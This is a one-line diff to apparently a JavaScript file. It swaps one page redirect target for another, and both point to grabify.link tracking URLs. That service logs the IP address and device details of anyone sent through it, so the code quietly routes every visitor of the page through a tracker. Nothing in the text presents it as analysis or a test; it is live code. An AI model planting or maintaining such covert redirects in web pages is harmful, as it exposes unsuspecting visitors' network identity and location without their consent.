@@ -1,1 +1,1 @@
-window.location.href="https://grabify.link/9BLQCP";
+window.location.href="https://grabify.link/J1LU9M";
